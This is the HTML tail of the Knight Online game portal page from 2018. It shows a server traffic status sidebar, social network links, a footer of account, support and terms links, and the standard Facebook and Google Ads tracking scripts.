		<!--
		<div class="live_panel" data-streaming='https://api.twitch.tv/kraken/streams/nttgame'  data-host-target='http://chatdepot.twitch.tv/rooms/nttgame/host_target' id="flagData" style="display:none;">
			<div class="live_panel_inner">
				<h1 class="live_title"></h1>
				
				<p class="live_elapsed_time">&nbsp;</p>
				<div class="live_status" live="on" lang="en" onclick="document.location.href='//www.nttgame.com/knight/en/community/tournament_live';" >ON LIVE</div>
				<div class="live_close_button" lang="en" style="cursor: pointer;">CLOSE</div>
			</div>
		</div>
		//-->
		<!-- Tournament Live Panel Ends -->
	

		<script>$(document).ready(function(){var flag=$('#flagData').data('flag');var streamingURL=$('#flagData').data('streaming');$.getJSON(streamingURL+".json?callback=?",function(c){if(c.stream==null){$("#flagData").hide();}else{$("#flagData").show();$("#flagData .live_title").text(c.stream.channel.status);}});$('.live_close_button').click(function(){$("#flagData").hide();});});</script>
	

    </section>
    
    <div id="popup-image" class="mfp-hide" style="width:980px; margin: 0px auto;">
		<div class="popup_facebook" style="width:980px;height:400px;background:url(//image.nttgame.com/knight/images/popup/facebook_banner.jpg) no-repeat left top">
			<span style="display:block; font-family:open sans; font-size:12px; width:100%; height:24px; padding-top:4px; vertical-align:top;">
				<input type="checkbox" name="vehicle" value="Bike" id="popup-image-close">Do not show this message again for today.
			</span>
			<a href="https://www.facebook.com/knightonlineus?ref=hl" title="'Like' us on Facebook" target="_blank"><span style="display:block; width:100%; height:372px;"></span></a>
		</div>
	</div>




<script type="text/javascript"></script>


		
		<!-- HOME RIGHT SECTION -->
		
	<aside class="right_side">




        <!--[Start]Server Status-->
		<div class="ServerStatus right_side_content">
            <h6 class="main">
                TRAFFIC STATUS OF THE SERVERS
                <span class="time">2018-04-28 17:10:00</span>
            </h6>
            <dl class="servers">
															<dt>ARES</dt>
						<dd><span><em style="width:108.61538461538%;"></em></span></dd>
																																								<dt>DIEZ</dt>
						<dd><span><em style="width:109%;"></em></span></dd>
																																								<dt>GORDION</dt>
						<dd><span><em style="width:94.692307692308%;"></em></span></dd>
																																								<dt>ROSETTA</dt>
						<dd><span><em style="width:138.76923076923%;"></em></span></dd>
																																								<dt>OLYMPIA</dt>
						<dd><span><em style="width:105.92307692308%;"></em></span></dd>
																																								<dt>MANES1</dt>
						<dd><span><em style="width:84.076923076923%;"></em></span></dd>
																
						<dt>MANES2</dt>
						<dd><span><em style="width:128.69230769231%;"></em></span></dd>
																																			<dt>DESTAN1</dt>
						<dd><span><em style="width:71.461538461538%;"></em></span></dd>
																
						<dt>DESTAN2</dt>
						<dd><span><em style="width:134.38461538462%;"></em></span></dd>
																								            </dl>
			<div style="display: block; font-size:9px; line-height: 1;">(Non-Premium Users might wait in the queue due to Premium User Capacity)</div>
        </div>
        <!--[End]Server Status-->
		

        <!--[Start]Social Networking Services-->
		<div class="SNS right_side_content">
            <h6 class="main sns">SOCIAL NETWORKS</h6>
            <div class="main_sns_list">
                <span class="twitter"><a href="https://twitter.com/knightonline" target="_blank" title="twitter"></a></span>
									<span class="facebook"><a href="https://www.facebook.com/knightonlineus" target="_blank" title="facebook"></a></span>
								<span class="instagram"><a href="https://www.instagram.com/knightonlinenttgame/ " target="_blank" title="instagram"></a></span>
                <span class="twitch"><a href="http://www.twitch.tv/nttgame" target="_blank" title="twitch"></a></span>
				<span class="youtube"><a href="https://www.youtube.com/user/KnightOnlineNTT" target="_blank" title="youtube"></a></span>
            </div>
        </div>
        <!--[End]Social Networking Services-->
        
		
		
		<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" width="180" height="3" alt="line" title="line" style="margin-left:5px;" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"> 

		<p style="display:block; height:0;"></p>

		<a href="//www.nttgame.com/knight/en/download/client/">
			<div class="gamedownload" style="margin: 5px 0 5px 0;"></div>
		</a>
		<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" width="180" height="3" alt="line" title="line" style="margin-left:5px;" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"> 
		<a href="//www.nttgame.com/knight/en/guide/introduction/">
			<div class="beginner_guide" style="margin: 5px 0 5px 0;"></div>
		</a> 
		<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" width="180" height="3" alt="line" title="line" style="margin-left:5px;" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"> 
		<a href="https://forum.nttgame.com" target="_blank">
			<div class="forum" style="margin: 3px 0 2px 0;"></div>
		</a> 
		<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" width="180" height="3" alt="line" title="line" style="margin-left:5px;" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"> 
		<a href="//www.nttgame.com/knight/en/guide/character/">
			<div class="chracter" style="margin: 3px 0 2px 0;"></div>
		</a> 
		<img src="//image.nttgame.com/filegate/knight/images/131218/line.png" width="180" height="3" alt="line" title="line" style="margin-left:5px;" data-pagespeed-url-hash="2722351376" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"> 
		<a href="//www.nttgame.com/knight/en/store/resellers/">
			<div class="resellers" style="margin: 5px 0 5px 0;"></div>
		</a>
	</aside>
	

	

	</div>

  <!-- FOOTER & COPYRIGHT -->
  <style>footer{height:240px;color:#ccc;width:960px;margin:0 auto}footer>ul{}footer>ul>li{width:20%;float:left}footer ul{list-style:none;padding:0;margin-left:15px;margin-top:0}footer>ul>li ul li{font-size:14px;text-align:left;margin-left:30px;line-height:23px}footer>ul>li ul li a{text-decoration:none!important;color:#198dc3}footer>ul>li ul li a:hover{color:#ddd!important}footer h4{width: 70%%;padding:10px;background-color:#000;font-weight:bold;font-size:14px;color:#fff;text-transform:uppercase;text-align:center;margin-bottom:10px;margin-left:10px;border-bottom:1px solid #fff;font-family:"Times New Roman",Times,serif}#footer-wrapper-logos{display:inline-block;margin-top:35px}.footer_popup_lightbox iframe{width:810px;height:640px;overflow:hidden}.footer_popup_lightbox iframe table{display:none}</style>
<div style="clear:both;"></div>
<footer>

    <ul>
        <li>
            <h4 class="home">CORPORATION</h4>
			<ul>
				<li><a class="logo" href="/en/corporate/about" title="NTT Game Portal – Free to Play Online Games Portal">About NTTGame</a></li>
				<li><a href="http://support.nttgame.com/" title="NTT Game Support">Contact Us</a></li>
			</ul>
        </li>
        <li>
            <h4 class="services">GAMES</h4>

            <ul>
			   <li><a href="//www.nttgame.com/knight/en" title="Knight Online – Free to Play 3D MMORPG Game">Knight Online</a></li>
               <li><a href="/phantomers/en/" title="PHANTOMERS – Free sign-up to play worldwide FPS Phantomers Game">Phantomers</a></li>
			   <li><a href="/madtanks/en/" title="">Mad Tanks</a></li>
            </ul>
        </li>
        <li>
            <h4 class="reachus">ACCOUNT</h4>

            <ul>
                <li><a href="/account/">My Account</a></li>
                <li><a href="https://billing.nttgame.com/payment/payment.aspx">Payment History</a></li>
                <li><a href="http://support.nttgame.com/">Account Issues</a></li>
                <li><a href="http://otp.nttgame.com/">ICS / OTP</a></li>
            </ul>
        </li>
        <li>
            <h4 class="clients">SUPPORT</h4>

            <ul>
                <li><a href="http://support.nttgame.com/index.php?/Default/Tickets/Submit">Send Ticket</a></li>
                <li><a href="http://support.nttgame.com/index.php?/Default/Knowledgebase/List">Knowledge Base</a></li>
                <li><a href="http://support.nttgame.com/index.php?/Default/Troubleshooter/List">Troubleshooting</a></li>
            </ul>
        </li>
		<li>
            <h4 class="clients">TERMS</h4>

            <ul>
  				<li><a target="_blank" href="/en/corporate/useragreement" title="User Agreement for Online Gamers">User Agreement</a></li>
                <li><a target="_blank" href="/en/corporate/privacypolicy" title="Privacy Policy for Online Gamers">Privacy Policy</a></li>
                <li><a target="_blank" href="/en/corporate/rulesofconduct" title="Rules of Conduct for Online Gamers">Rules of Conduct</a></li>
            </ul>
        </li>
    </ul>
	
	<div id="footer-wrapper-logos">
		<div style="margin:0 auto; width: 750px;">
			<div style="float:left;">
			<img src="//image.nttgame.com/filegate/knight/images/131218/mgame_logo.png" alt="MGame Logo" data-pagespeed-url-hash="3244227887" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">&emsp;
			<img src="//image.nttgame.com/filegate/knight/images/131218/ntt_logo.png" alt="NTT Game Logo" title="NTT Game Logo" data-pagespeed-url-hash="1200670084" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"><br><br>
			<p>© 2005-2018.<br>All Rights Reserved. Licensed and published by Game Cafe Services, Inc.</p>
			</div>
			<div style="float:left;">
				<div style="float:left; display:inline-block; margin-left:50px; margin-top:5px;">
					<a name="trustlink" href="http://secure.trust-guard.com/security/7911" rel="nofollow" target="_blank" onclick="var nonwin=navigator.appName!='Microsoft Internet Explorer'?'yes':'no'; window.open(this.href.replace(/https?/, 'https'),'welcome','location='+nonwin+',scrollbars=yes,width=517,height='+screen.availHeight+',menubar=no,toolbar=no'); return false;" oncontextmenu="var d = new Date(); alert('Copying Prohibited by Law - This image and all included logos are copyrighted by trust-guard \251 '+d.getFullYear()+'.'); return false;"><img name="trustseal" alt="Security Seals" style="border: 0;" src="//dw26xg4lubooo.cloudfront.net/seals/security/7911-mini.gif" data-pagespeed-url-hash="664235178" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a>
				</div>
				<div style="float:left;display:inline-block; margin-left:10px; margin-top:10px;">
					<a href="javascript:void(0);" id="siteSealFauxBadge" style="text-decoration: none; font-family: Arial, Verdana, Helvetica;"><div align="center" alt="Click to Verify" title="Click to Verify" style="border-width: 0px; background-image: url(&quot;https://tracedseals.starfieldtech.com/siteseal/images/siteseal_base_lite.gif&quot;); background-repeat: no-repeat; cursor: pointer; width: 132px; height: 31px;"><div style="position: relative; top: 20px; left: 12px; width: 106px; line-height: 7.5pt;"><div style="color: rgb(106, 156, 186); font-weight: bold; font-size: 6pt;">2015-02-10</div></div></div></a><span id="cdSiteSeal1"><script type="text/javascript" src="//tracedseals.starfieldtech.com/siteseal/get?scriptId=cdSiteSeal1&amp;cdSealType=Seal1&amp;sealId=55e4ye7y7mb73a1a43249cd229a8e3e4d0hy7mb7355e4ye71b40c35e18424feb"></script></span>
				</div>
			</div>
		</div>
	</div>
</footer>

<script>$(document).ready(function(){$('.footer_popup').magnificPopup({type:'iframe',iframe:{markup:'<div class="mfp-iframe-scaler footer_popup_lightbox">'+'<div class="mfp-close"></div>'+'<iframe class="mfp-iframe" frameborder="0" allowfullscreen></iframe>'+'</div>'}});});</script>




</div>
<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","//connect.facebook.net/en_US/fbevents.js");fbq("init","661029510681560");fbq("track","PageView");</script>








 












  </body><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/987499552/?random=1524933356454&amp;cv=9&amp;fst=1524933356454&amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=768&amp;u_w=1366&amp;u_ah=728&amp;u_aw=1366&amp;u_cd=24&amp;u_his=4&amp;u_tz=180&amp;u_java=false&amp;u_nplug=4&amp;u_nmime=5&amp;gtm=G4d&amp;sendb=1&amp;frm=0&amp;url=https%3A%2F%2Fwww.nttgame.com%2Fknight%2Fen&amp;tiba=Knight%20Online%20%E2%80%93%20Free%20to%20Play%203D%20MMORPG%20Game&amp;async=1&amp;rfmt=3&amp;fmt=4"></script></html>
